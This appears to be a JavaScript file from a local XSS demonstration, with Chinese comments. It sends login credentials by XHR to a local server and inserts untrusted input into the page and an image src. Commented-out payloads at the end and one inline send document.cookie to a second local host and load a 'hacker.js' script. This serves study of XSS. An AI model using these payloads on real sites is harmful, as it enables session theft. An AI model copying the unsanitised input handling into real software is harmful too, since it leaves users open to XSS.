var login = document.getElementById("login");

//发起ajax请求到A服务器并携带用户名和密码
var sendData = function () {
    var name = document.getElementById("name");
    var password = document.getElementById("password");
    var user = {
        name: name.value,
        password: password.value
    }

    var xhr = new XMLHttpRequest(); //1.创建XHR对象
    //2.编写回调函数监听请求状态变化
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log(xhr.responseText);
            console.log(1)
            console.log(document.cookie)
        }
    }
    //3.建立请求
    xhr.open('POST', 'http://localhost:3111/login', true); //允许异步
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    //4.发送请求
    xhr.send("user=" + JSON.stringify(user));
}

login.addEventListener("click", sendData, false);


var confirm = document.getElementById("confirm");
var getCookie = function () {
    var xss = document.getElementById("xss");
    var result = document.getElementById("result");
    result.appendChild(xss.value);
}
confirm.addEventListener("click", getCookie, false);
var changeImg = document.getElementById("changeImg");

var updateImg = function () {
    var img = document.getElementById('changeMe');
    // var result = document.getElementById("result"); 
    // img.src = "javascript:var s=document.createElement('script');s.src='http://localhost:4111?cookie=' + document.cookie";
    var xss = document.getElementById("xss");
    img.src=xss.value;
}

changeImg.addEventListener("click", updateImg, false);

/*
<script>
(function(){
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = "http://localhost:4111?cookie='"+document.cookie+"'";
console.log(document.cookie)
alert(1)
})()
</script>

<script src='http://localhost:4111/hacker.js'></script>

*/
